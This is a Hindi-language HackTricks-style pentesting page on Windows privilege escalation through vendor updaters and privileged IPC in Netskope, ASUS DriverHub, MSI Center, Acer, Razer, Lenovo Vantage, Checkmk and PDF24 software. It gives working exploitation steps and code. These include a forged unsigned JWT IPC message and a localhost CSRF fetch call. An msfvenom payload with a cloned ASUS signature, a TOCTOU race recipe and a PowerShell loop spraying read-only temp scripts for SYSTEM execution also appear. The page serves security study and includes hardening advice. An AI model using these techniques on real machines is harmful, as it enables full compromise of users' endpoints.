# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows के उन local privilege escalation chains का सामान्य रूप बताता है, जो enterprise endpoint agents और updaters में पाए गए हैं। इनमें कम बाधाओं वाला IPC surface और privileged update flow होता है। इसका एक प्रतिनिधि उदाहरण Windows के लिए Netskope Client < R129 (CVE-2025-0309) है, जहाँ कम-विशेषाधिकार वाला user enrollment को attacker-controlled server की ओर मोड़ सकता है और फिर malicious MSI भेज सकता है, जिसे SYSTEM service install करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

ऐसे ही products के विरुद्ध इस्तेमाल किए जा सकने वाले मुख्य विचार:
- Privileged service के localhost IPC का दुरुपयोग करके उसे attacker server पर re-enrollment या reconfiguration के लिए मजबूर करें।
- Vendor के update endpoints लागू करें, rogue Trusted Root CA दें और updater को malicious, “signed” package की ओर निर्देशित करें।
- कमजोर signer checks (CN allow-lists), optional digest flags और ढीली MSI properties को bypass करें।
- अगर IPC “encrypted” हो, तो registry में संग्रहीत विश्व-पठनीय machine identifiers से key/IV निकालें।
- अगर service callers को image path/process name के आधार पर सीमित करती है, तो allow-listed process में inject करें या उसे suspended अवस्था में शुरू करके minimal thread-context patch के ज़रिए अपनी DLL bootstrap करें।

Custom local TCP services की भी उसी तरह identity और input-boundary की समीक्षा होनी चाहिए, भले ही उन्हें PIN या किसी अन्य application credential की ज़रूरत हो। Listener को उसके process और effective service account से जोड़ें, फिर deployed binary/version की सटीक जानकारी जाँचें और पता करें कि caller-controlled fields को fixed buffers में copy करने या child-process command बनाने से पहले उनकी length जाँची जाती है या नहीं। [Microsoft की buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) बताती है कि privileged native code में unchecked external input क्यों खतरनाक है। Loopback listener, hardcoded credential या केवल process name से memory corruption या SYSTEM execution साबित नहीं होता; reachability, authorization, code path और mitigations अलग-अलग शर्तें हैं। Routine enumeration को passive रखें; live service को crash-length inputs न भेजें।

---
## 1) localhost IPC के ज़रिए enrollment को attacker server पर भेजने के लिए मजबूर करना

कई agents में user-mode UI process होता है, जो localhost TCP पर JSON का उपयोग करके SYSTEM service से बात करता है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token बनाएँ जिसके claims backend host (जैसे AddonUrl) को नियंत्रित करें। alg=None का उपयोग करें, ताकि signature की आवश्यकता न हो।
2) अपने JWT और tenant name के साथ provisioning command चलाने वाला IPC message भेजें:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service आपके rogue server से enrollment/config के लिए अनुरोध करना शुरू करती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट:
- अगर caller verification path/name-based है, तो allow-listed vendor binary से अनुरोध भेजें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

### Network-exposed management IPC

यह trust boundary हमेशा localhost तक सीमित नहीं होती। रिपोर्ट किए गए MyReport Updater 2.1.1 मामले में, एक `LocalSystem` service सभी interfaces पर listen करती थी और reference host, port तथा operating mode में unauthenticated gRPC configuration change स्वीकार करती थी। Remote variant के लिए listener तक network access और चुने गए reference तक service की outbound access—दोनों ज़रूरी थे। इनका आकलन इस बात से अलग करें कि बाद का package flow file-write boundary पार कर सकता है या नहीं।<sup>[[16]](#references)</sup>

---
## 2) SYSTEM के रूप में code चलाने के लिए update channel hijack करना

जब client आपके server से बात करने लगे, तो अपेक्षित endpoints लागू करें और उसे attacker MSI की ओर मोड़ें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत छोटे updater interval वाला JSON config लौटाएँ, जैसे:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate लौटाएँ। Service इसे Local Machine Trusted Root store में इंस्टॉल करती है।
3) /v2/checkupdate → किसी malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

आम तौर पर देखे जाने वाले checks को bypass करना:
- Signer CN allow-list: Service शायद सिर्फ यह जाँचती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA इसी CN वाला leaf जारी करके MSI को sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की benign MSI property शामिल करें। Install के समय इसका enforcement नहीं होता।
- Optional digest enforcement: Config flag (जैसे, check_msi_digest=false) अतिरिक्त cryptographic validation को बंद कर देता है।

नतीजा: SYSTEM service आपके MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से इंस्टॉल करती है और NT AUTHORITY\SYSTEM के रूप में arbitrary code चलाती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass से सबक: अगर कोई vendor update source को cryptographically authenticate करने के बजाय “trusted” domains की छोटी-सी allow-list बनाकर जवाब देता है, तो vendor के अपने redirectors या reverse proxies खोजें, जिनसे आप अब भी traffic को अपनी मनचाही दिशा में भेज सकें। Netskope के मामले में, बाद की सार्वजनिक research से पता चला कि R129-युग की allow-list को भी `rproxy.goskope.com` के ज़रिए abuse किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। Hostname allow-lists को trust boundary नहीं, बल्कि एक मामूली बाधा समझें।<sup>[[14]](#references)</sup>

एक अन्य failure mode है **self-consistent लेकिन unauthenticated package metadata**। MyReport मामले में, attacker-controlled reference ने एक modified archive serve किया, जबकि एक intermediary ने updater तक पहुँचने से पहले vendor के MD5 digest और size responses बदल दिए। इन values का मेल response consistency जाँचता था, vendor origin नहीं; किसी MD5 collision की ज़रूरत नहीं थी। Caller द्वारा चुनी गई installation directory ने privileged extraction को file-write boundary बना दिया। इससे मिलने वाला DLL-loading primitive, [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) के तहत बताया गया है।<sup>[[16]](#references)</sup>

---
## 3) Encrypted IPC requests forge करना (जब मौजूद हों)

R127 से Netskope ने IPC JSON को encryptData field में wrap करना शुरू किया, जो Base64 जैसा दिखता है। Reverse engineering से पता चला कि इसमें AES का इस्तेमाल होता है और key/IV, registry values से derive होते हैं जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption दोहरा सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करने लगे, तो HKLM के अंतर्गत मौजूद device IDs, product GUIDs और install IDs को material के रूप में खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत मौजूद allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने की कोशिश करती हैं।

Bypass के दो व्यावहारिक तरीके:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसके अंदर से IPC proxy करें।
- किसी allow-listed binary को suspended अवस्था में launch करें और driver द्वारा लागू tamper rules को संतुष्ट करने के लिए CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (§5 देखें)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection के अनुकूल injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से खतरनाक rights हटाने के लिए minifilter/OB callbacks driver (जैसे, Stadrv) शामिल करते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: अधिकारों को THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

इन सीमाओं का पालन करने वाला एक भरोसेमंद user-mode loader:
1) CREATE_SUSPENDED के साथ किसी vendor binary का CreateProcess करें।
2) वे handles लें जिनकी आपको अब भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या, यदि आप किसी ज्ञात RIP पर code patch करते हैं, तो सिर्फ THREAD_RESUME)।
3) ntdll!NtContinue (या किसी अन्य शुरुआती, निश्चित रूप से mapped thunk) को एक छोटे stub से overwrite करें, जो आपकी DLL के path पर LoadLibraryW call करे और फिर वापस jump करे।
4) अपने stub को process के अंदर चलाने और अपनी DLL load करने के लिए ResumeThread करें।

क्योंकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का इस्तेमाल नहीं किया (आपने उसे खुद create किया था), इसलिए driver की policy का पालन होता है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) व्यावहारिक tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing, और ज़रूरी endpoints serve करने की प्रक्रिया automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages तैयार करता है और allow-listed binary से request भेजने के लिए suspended-process injection भी शामिल करता है।<sup>[[4]](#references)</sup>

## 7) Unknown updater/IPC surfaces के लिए तेज़ triage workflow

किसी नए endpoint agent या motherboard “helper” suite की जाँच करते समय, एक त्वरित workflow आमतौर पर यह पता लगाने के लिए पर्याप्त होता है कि क्या आप एक संभावित privesc target देख रहे हैं:<sup>[[6]](#references)</sup>

1) Loopback listeners की सूची बनाएँ और उन्हें vendor processes से map करें:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Candidate named pipes की सूची बनाएँ:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को निकालें:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) पहले user-mode client से endpoint names, JSON keys, और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) वास्तविक trust predicate खोजें, न कि केवल उस code path को जो अंततः process लॉन्च करता है:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

प्राथमिकता देने योग्य पैटर्न:
- `CryptQueryObject`/certificate parsing के साथ `WinVerifyTrust` न होना आमतौर पर यह दर्शाता है कि “certificate exists” को “certificate is trusted” मान लिया गया, जिससे certificate cloning या अन्य fake-signer tricks संभव हो जाती हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` अक्सर attacker-controlled lookalike domains के ज़रिए exploit किया जा सकता है।
- अगर low-privileged GUI तय करता है कि “the file is trusted” और SYSTEM broker बस उस नतीजे का उपयोग करता है, तो client-side DLL/JS को patch या reimplement करने से अक्सर यह boundary पूरी तरह bypass हो जाती है (Razer-style split validation)।
- अगर broker payload को `%TEMP%`/`C:\Windows\Temp` में copy करता है और फिर उसी path से उसे validate या schedule करता है, तो तुरंत TOCTOU replacement windows और ऐसे sibling plugin modules की जाँच करें जो कमज़ोर checks वाले alternate `ExecuteTask()` wrappers देते हैं।<sup>[[6]](#references)</sup>

जिन targets में named pipes का भारी इस्तेमाल होता है, उनमें protocol को गहराई से reverse करना शुरू करने से पहले कमज़ोर DACLs और दूर से पहुँच योग्य pipes पहचानने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

अगर target callers को केवल PID, image path या process name से authenticate करता है, तो इसे boundary के बजाय एक speed bump समझें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को संतुष्ट करने के लिए पर्याप्त होता है। खास तौर पर named pipes के लिए, [client impersonation और pipe abuse पर यह पेज](named-pipe-client-impersonation.md) इस primitive को अधिक विस्तार से समझाता है।

किसी privileged **cleanup या restore broker** के लिए, pipe ACL के साथ-साथ path trust boundary का भी निरीक्षण करें। कम privileges वाला caller shared directory में restore destination चुनने या staged backup artifact का नाम बदलने में सक्षम हो सकता है, भले ही service executable और उसकी install directory सुरक्षित हों। अलग-अलग पुष्टि करें कि caller restore command तक पहुँच सकता है, exact staged input या filename बदल सकता है, broker higher identity के तहत चलता है, और उसका restore operation वास्तव में चुने गए protected path पर लिखता है। केवल writable staging directory या readable pipe से arbitrary privileged write साबित नहीं होता; destination mapping और service behavior की जाँच code review या controlled testing से करनी होगी। Passive enumeration के दौरान कोई अज्ञात cleanup command न चलाएँ, क्योंकि वह user files delete कर सकता है।

---
## 8) केवल vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

शिकार करने लायक एक नया रूप है **signed-client RPC broker**: कम privileges वाला Lenovo-signed desktop process एक SYSTEM service से बात करता है, और service JSON commands को `%ProgramData%` के अंतर्गत XML-described add-ins तक पहुँचाती है। एक बार **किसी भी स्वीकार्य signed client के अंदर** code execution हासिल हो जाए, तो हर `runas="system"` contract आपका attack surface बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **कॉलर पर इसलिए भरोसा करना क्योंकि उस पर vendor का signature है**: researchers ने writable directory में Lenovo-signed EXE copy करके और DLL side-load (`profapi.dll`) को सफल बनाकर authenticated context हासिल किया, जिससे पहले से trusted client के अंदर arbitrary code चला।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के अंतर्गत घोषित होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests की enumeration से broker को ही reverse करने की तुलना में असली privileged verbs जल्दी मिल सकते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse, और substring-based registry path checks मिले, जिनसे intended hive के बाहर writes संभव हुईं।

किसी target पर उपयोगी recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Practical takeaway: जब भी कोई helper suite ऐसा broker expose करे जो पहले **caller process** को authenticate करता है और उसके बाद ही दर्जनों plugin/add-in commands को dispatch करता है, तो front-door trust check bypass करने के बाद रुकें नहीं। Manifest/contract table dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel में आमतौर पर कई second-stage bugs छिपे होते हैं।

---
## 1) Privileged HTTP APIs के विरुद्ध Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 पर user-mode HTTP service (ADU.exe) चलाता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। Origin filter, Origin header और `/asus/v1.0/*` से expose किए गए download URLs में बस `string_contains(".asus.com")` जाँचता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसे किसी भी attacker-controlled host से यह जाँच पास की जा सकती है और JavaScript से state-changing requests भेजी जा सकती हैं।<sup>[[6]](#references)</sup> बाईपास के अन्य तरीकों के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और उस पर malicious webpage host करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे `Reboot`, `UpdateApp`) को call करें।
3) Handler द्वारा अपेक्षित JSON body भेजें — packed frontend JS में नीचे दिया गया schema दिखता है।

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

नीचे दिखाया गया PowerShell CLI भी तब सफल होता है, जब Origin header को trusted value पर spoof किया जाता है:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

इसलिए attacker site पर किसी भी browser visit से 1-click (या `onload` के ज़रिए 0-click) local CSRF होता है, जो SYSTEM helper को चलाता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में बताए गए मनमाने executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation में वही substring logic इस्तेमाल होता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार किया जाता है। Download के बाद, ADU.exe चलाने से पहले सिर्फ़ यह जाँचता है कि PE में signature है और Subject string ASUS से मेल खाती है — कोई `WinVerifyTrust` या chain validation नहीं।

इस flow का दुरुपयोग करने के लिए:
1) एक payload बनाएँ (जैसे, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) उसमें ASUS के signer को clone करें (जैसे, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` जैसे दिखने वाले domain पर host करें और ऊपर बताए गए browser CSRF के ज़रिए UpdateApp को trigger करें।

क्योंकि Origin और URL filters, दोनों substring-based हैं और signer check सिर्फ़ strings की तुलना करता है, DriverHub attacker binary को अपने elevated context में download और execute करता है।<sup>[[6]](#references)</sup>

---
## 1) updater के copy/execute paths के भीतर TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol उपलब्ध कराती है, जिसमें हर frame का प्रारूप `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) में `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` मौजूद है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के ज़रिए signature verify करता है (certificate subject का “MICRO-STAR INTERNATIONAL CO., LTD.” से मेल खाना और `WinVerifyTrust` का सफल होना ज़रूरी है)।
3) एक scheduled task बनाता है, जो temp file को attacker-controlled arguments के साथ SYSTEM के रूप में चलाता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। Attacker:
- एक वैध MSI-signed binary की ओर इशारा करने वाला Frame A भेज सकता है (इससे signature check सफल होना और task queue होना तय होता है)।
- Verification पूरी होने के तुरंत बाद `MSI Center SDK.exe` को malicious payload से overwrite करने के लिए लगातार Frame B messages भेजकर race कर सकता है।

Scheduler चलने पर, मूल file को validate करने के बावजूद वह overwritten payload को SYSTEM के तहत execute करता है। विश्वसनीय exploitation के लिए, TOCTOU window जीतने तक CMD_AutoUpdateSDK को spam करने वाले दो goroutines/threads इस्तेमाल करें।<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा load किया गया हर plugin/DLL एक Component ID प्राप्त करता है, जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` के अंतर्गत stored होती है। Frame के पहले 4 bytes उस component को चुनते हैं, जिससे attackers किसी भी module को commands भेज सकते हैं।
- Plugins अपने task runners परिभाषित कर सकते हैं। `Support\API_Support.dll` में `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` मौजूद है और यह सीधे `API_Support.EX_Task::ExecuteTask()` call करता है — **कोई signature validation नहीं**। कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` चलाने के लिए निर्देशित करके निश्चित रूप से SYSTEM execution प्राप्त कर सकता है।
- Wireshark से loopback traffic sniff करने या dnSpy में .NET binaries को instrument करने पर Component ↔ command mapping जल्दी सामने आ जाती है; फिर custom Go/ Python clients frames को replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` उपलब्ध कराता है, और इसका discretionary ACL remote clients (जैसे, `\\TARGET\pipe\treadstone_service_LightMode`) को अनुमति देता है। File path के साथ command ID `7` भेजने पर service का process-spawning routine invoke होता है।
- Client library arguments के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` से dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) में instrumentation के सुझाव देखें) दिखाता है कि native handler, `CreateProcessAsUser` call करने से पहले, इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch चलती है, जो पूरा SYSTEM token बनाए रखती है और high-integrity SID (`S-1-16-12288`) सेट करती है। इसलिए spawned binary बिना किसी पाबंदी के SYSTEM के रूप में चलती है, स्थानीय तौर पर भी और cross-machine भी।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ मिलाकर lab VMs पर भी ACC स्थापित करें और vendor hardware के बिना pipe को आज़माएँ।<sup>[[6]](#references)</sup>

ये IPC bugs दिखाते हैं कि localhost services के लिए mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू करना क्यों ज़रूरी है, और हर module के “run arbitrary binary” helper में समान signer verifications क्यों होने चाहिए।

---
## 3) कमज़ोर user-mode validation पर आधारित COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस परिवार में एक और उपयोगी pattern जोड़ा: कम privileges वाला user, `RzUtility.Elevator` के ज़रिए process launch करने के लिए COM helper से अनुरोध कर सकता है, जबकि trust का निर्णय privileged boundary के भीतर मज़बूती से लागू करने के बजाय user-mode DLL (`simple_service.dll`) को सौंपा गया है।

देखा गया exploitation path:
- COM object `RzUtility.Elevator` instantiate करें।
- Elevated launch का अनुरोध करने के लिए `LaunchProcessNoWait(<path>, "", 1)` call करें।
- Public PoC में अनुरोध भेजने से पहले `simple_service.dll` के भीतर PE-signature gate को patch करके हटा दिया जाता है, जिससे attacker द्वारा चुना गया कोई भी executable launch किया जा सकता है।<sup>[[6]](#references)[[10]](#references)</sup>

PowerShell का न्यूनतम invocation:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

सामान्य निष्कर्ष: “helper” suites को reverse करते समय केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater` या `Utility` जैसे नामों वाली COM classes की जाँच करें, फिर सत्यापित करें कि privileged service वास्तव में target binary को खुद validate करती है या केवल उस नतीजे पर भरोसा करती है जिसकी गणना patch किए जा सकने वाले user-mode client DLL ने की है। यह पैटर्न Razer तक सीमित नहीं है: कोई भी split design, जहाँ high-privilege broker low-privilege side से मिले allow/deny निर्णय का उपयोग करता है, privesc surface हो सकता है।


---
## MSI repair के दौरान predictable temp script execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अब भी privileged actions लागू करने के लिए `C:\Windows\Temp` में एक अस्थायी `.cmd` लिखते हैं और उसे `SYSTEM` के रूप में execute करते हैं। अगर filename predictable हो और service मौजूदा files को सुरक्षित रूप से दोबारा न बनाए, तो low-privileged user पहले से एक future temp file को **read-only** बना सकता है और privileged process से उसकी अपनी script के बजाय attacker-controlled content execute करवा सकता है।

कमज़ोर Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- प्रभावित branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

व्यावहारिक workflow:
1. मौजूदा process IDs या running agent PID के आधार पर एक यथार्थवादी PID range का अनुमान लगाएँ।
2. एक छोटी **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. संभावित range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` को spray करें और हर file को read-only चिह्नित करें।
4. cached MSI का repair trigger करें, ताकि privileged service temp script को फिर से बनाने की कोशिश करे और उसके बाद उसे execute करे।<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

यदि vulnerable product Windows Installer से install किया गया है, तो repair trigger करने से पहले `C:\Windows\Installer` के अंतर्गत मौजूद बेतरतीब-सा दिखने वाले cached MSI को उसके product name से map करें:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta` तब उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि क्या कोई मौजूदा desktop/disconnected session repair को सही ढंग से trigger कर सकता है।<sup>[[7]](#references)</sup>
- यह pattern दूसरे endpoint agents और updaters पर भी लागू होता है, जो **world-writable locations में temp scripts stage करते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। अनुमानित नामों, exclusive create semantics की कमी, और ऐसे repair/update flows की जाँच करें जिन्हें on demand trigger किया जा सकता है।

### Interactive installer repair और privileged console

PDF24 Creator 11.15.1 MSI-repair के एक अलग जोखिम का उदाहरण है: इसका printer-install custom action repair के दौरान SYSTEM rights के साथ एक visible console शुरू कर सकता है। Vendor ने इस व्यवहार को ठीक करने के लिए 11.15.2 में MSI installer बदल दिया। किसी पुराने product version को केवल triage lead मानें। जाँचें कि MSI package registered है या उस तक पहुँचा जा सकता है, क्या यह user repair शुरू कर सकता है, क्या vulnerable custom action और log-file delay मौजूद हैं, और क्या कोई interactive desktop console दिखा सकता है। रिपोर्ट किए गए delay में `faxPrnInst.log` पर oplock का उपयोग किया गया था; केवल सामान्य file writability ही access की शर्त नहीं थी। Non-interactive shell, package तक पहुँच न होना, या patched installer इस chain को रोक सकते हैं। यह issue `AlwaysInstallElevated` पर निर्भर नहीं करता और predictable temporary script को बदलने से अलग है।

---
## कमज़ोर updater validation के ज़रिए remote supply-chain hijack (WinGUp / Notepad++)

जून 2025 और दिसंबर 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure से समझौता करने वाले हमलावरों ने चुनिंदा victims को दुर्भावनापूर्ण manifests भेजे। पुराने WinGUp-आधारित updaters update की authenticity को पूरी तरह verify नहीं करते थे, इसलिए एक hostile XML response clients को हमलावर-नियंत्रित URLs पर redirect कर सकता था। चूँकि client, downloaded installer पर trusted certificate chain और valid PE signature—दोनों लागू किए बिना HTTPS content स्वीकार कर लेता था, victims ने trojanized NSIS `update.exe` download करके execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting से समझौता करें और update checks के जवाब में attacker metadata दें, जो malicious download URL की ओर संकेत करता हो।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **अपना signed binary लाएँ + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में एक malicious `log.dll` रखें। Signed binary चलने पर Windows, `log.dll` को sideload करता है; यह Chrysalis backdoor को decrypt करके reflectively load करता है (static detection में बाधा डालने के लिए Warbird-protected + API hashing का उपयोग)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे, `EnumWindowStationsW`) का उपयोग करती है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए hardening/detection के मुख्य बिंदु:
- Downloaded installer की **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest पर भी हस्ताक्षर करें (जैसे, XMLDSig)। Manifest-नियंत्रित redirects को validation के बिना block करें।
